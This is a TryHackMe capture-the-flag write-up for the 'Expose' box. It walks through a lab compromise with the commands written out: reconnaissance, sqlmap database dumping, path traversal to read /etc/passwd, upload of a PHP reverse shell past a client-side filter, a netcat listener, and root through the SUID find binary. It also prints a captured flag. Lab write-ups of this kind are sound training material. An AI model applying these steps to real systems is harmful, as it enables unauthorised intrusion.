---
header_type: hero
header_img: 
title: 
subtitle: 
last_modified_at: 2024-11-26 11:51
created: 2024-11-26
tags:
  - easy
categories: "[TryHackMe]"
---
# Expose
---
This CTF is meant to evaluate our red teaming skills against a linux box. 

#### Known Target Info
- IP: 10.10.27.154
- Linux Machine

## Initial Reconnaissance
---
When first looking into a target I like to first set the machines ip as a variable in my working terminal.
`export IP=10.10.27.154` 
Next comes port discovery, with using the following command I get the open ports returned rather quickly. ``nmap -sT -p T:21,22,53,1337,1883 -A $IP`` 
![[Pasted image 20241126120347.png]]
From that I find it important to get some more information about the open ports so I can use nmaps -A switch which will enable OS detection and version detection. ``nmap -sT -p T:21,22,53,1337,1883 -A $IP`` 
![[Pasted image 20241126120622.png]]
2 things from this immediately stand out to me. The fact that there is an open ftp port and anonymous ftp is allowed, as well as the apache httpd server on port 1337/tcp.
## Directory Enumeration
---
First I want to start a directory scan on the web app. 
``` bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u "http://$IP:1337"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.27.154:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 319] [--> http://10.10.27.154:1337/admin/]
/admin_101            (Status: 301) [Size: 323] [--> http://10.10.27.154:1337/admin_101/]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.27.154:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.27.154:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
Now sadly gobuster does not have recursive directory enumeration which is fine for right now because the 2 that catch my eye is the directories /admin and /admin_101 
`gobuster dir -w /usr/share/wordlists/dirb/big.txt -u "http://$IP:1337/admin"`
gives us a few directories that aren't super interesting 
`gobuster dir -w /usr/share/wordlists/dirb/big.txt -u "http://$IP:1337/admin_101"`
gives us the same directories as /admin does but this one also includes 2 more. so now it is time to take a look at the webpage through the browser.

## Manual testing
---
here we can see the /admin directory
![[imgs-attatch/Pasted image 20241126125425.png]]
when visiting the /admin_101 it looks the same but it has the email address field already prefilled.
![[imgs-attatch/Pasted image 20241126125534.png]]
The room gives us a slight clue on what to do next with the task stating 'necessary tools to complete the challenge, like Nmap, sqlmap, wordlists, PHP shell' and if you have paid attention so far we have only used nmap and wordlists so we should either use a PHP shell or sqlmap and sqlmap just so happens to have a post request injection function. Lets try that here.
To get the request we can use the burp proxy to intercept an example post request that we can provide to sqlmap. 
![[imgs-attatch/Pasted image 20241126131525.png]]
we can copy this to a file and for this example it will be called login-page.txt
On the tryhackme attackbox I was unable to find the location of sqlmap so I installed it via the apt package manager and was able to run the command 
``sqlmap -r login-page.txt --dump`` where the `--dump` will dump all database table entries. using this we discover the following:
![[imgs-attatch/Pasted image 20241126134636.png]]
![[imgs-attatch/Pasted image 20241126134615.png]]
This gives us a couple things, 2 new directories and a 2 logins. using the verydificult password we are able to login to the /admin_101 login page where we are greeted with ![[imgs-attatch/Pasted image 20241126135043.png]]
which does not seem to offer much. so we can then try out some of these new files. checking the ``/file1010111/index.php`` first we get a password prompt which we can use the discovered password for.
![[imgs-attatch/Pasted image 20241126135308.png]]
when the password is submitted we get the hint 
![[imgs-attatch/Pasted image 20241126135943.png]]
and when looking at the page source we get an even bigger hint ![[imgs-attatch/Pasted image 20241126140010.png]] `Try file or view as GET parameters?`
This makes me think that we can fuzz file paths using a parameter in the url. Since we are looking for a user we should check for local file inclusion and more specifically the passwd file which will show all users of the system. to do this we can request the url `http://10.10.27.154:1337/file1010111/index.php?file=../../../../etc/passwd` which does actually return useful information. it should be noted that it does not matter how many times we traverse up directories as long as we do it at least 4 times ('../' traverses up a directory)
![[imgs-attatch/Pasted image 20241126141701.png]]to view all of the users better we can view the page source or look at the req/res in burp. The page source gives us
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash

ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```
here we find the user zeamkish.
With this new found username we can login to the other url we found `http://10.10.27.154:1337/upload-cv00101011/index.php`
![[imgs-attatch/Pasted image 20241126142551.png]]here we find we can upload files to the site. 
![[imgs-attatch/Pasted image 20241126142702.png]]
When testing some example file types we find that the only ones that I can find that they accept are jpg and png. When investigating the source code I found this function: 
```javascript
function validate(){

 var fileInput = document.getElementById('file');
  var file = fileInput.files[0];
  
  if (file) {
    var fileName = file.name;
    var fileExtension = fileName.split('.').pop().toLowerCase();
    
    if (fileExtension === 'jpg' || fileExtension === 'png') {
      // Valid file extension, proceed with file upload
      // You can submit the form or perform further processing here
      console.log('File uploaded successfully');
	  return true;
    } else {
      // Invalid file extension, display an error message or take appropriate action
      console.log('Only JPG and PNG files are allowed');
	  return false;
    }
  }
}
```
This effectively means that the only validation it is looking for is the file to end in .png or .jpg which is great for us because that means we can upload a non png or jpg file but rename it to end in either jpg or png and before the file makes it to the backend we can rename it back to end in whatever filetype we would like. Since the task points us in the direction of using a php reverse shell we can generate one with the reverse shell generator. Selecting the php PentestMonkey script we can store that in a file named shell.png and upload it to the server.

Next we need to intercept the request to upload the file. So make sure burp suite is open and intercepting requests from your browser. After uploading the file and selecting upload you need to change filename from 'shell.png' to 'shell.php' this will make it so the server on the backend will interpret the file as a php file instead of a png. ![[imgs-attatch/Pasted image 20241126160940.png]]

The response lets you know that the file is successfully uploaded and where to reach the file.
![[imgs-attatch/Pasted image 20241126144215.png]]
Going to the directory the file that have been uploaded can be seen here.
![[imgs-attatch/Pasted image 20241126161911.png]]
Before clicking on the file make sure to run the listener on your attack box `nc -lnvp 9001`
![[imgs-attatch/Pasted image 20241126162412.png]]![[imgs-attatch/Pasted image 20241126162556.png]]
Since are the user www-data it makes sense on why we cannot read the flag.txt file but we can however read ssh_creds.txt which is where we get the ssh credentials for zeamkish
![[imgs-attatch/Pasted image 20241126162813.png]]
Once we ssh in we are able to read the flag.txt file.
![[imgs-attatch/Pasted image 20241126163015.png]]
`Flag: THM{USER_FLAG_1231_EXPOSE}`

#### Escalating privileges
Now that we have access to the machine it is time to escalate our privileges. What I like to look for first is if there is any SUID files. You can do this multiple ways but in order to be the most verbose about attack vectors I will be using LinEnum. From my attack machine I start a python http server to host the LinEnum.sh script. then from the Expose box I can use wget to retrieve the file from my attack box `wget 10.10.186.180:8000/LinEnum.sh`. In order for the file to be ran it needs to have execute permission `chmod +x LinEnum.sh` Once it has permission to execute running the command ``./LinEnum.sh`` will give a lot of output but some pertinet information for us is the SUID files.  ![[imgs-attatch/Pasted image 20241126170132.png]] 
seeing that the find command is apart of the SUID files we can checkout [GTFOBins](https://gtfobins.github.io/gtfobins/find/) this gives us the command `find . -exec /bin/sh -p \; -quit` Once executed we get a shell as root and from there we can find the flag located in the root folder.
![[imgs-attatch/Pasted image 20241126170507.png]]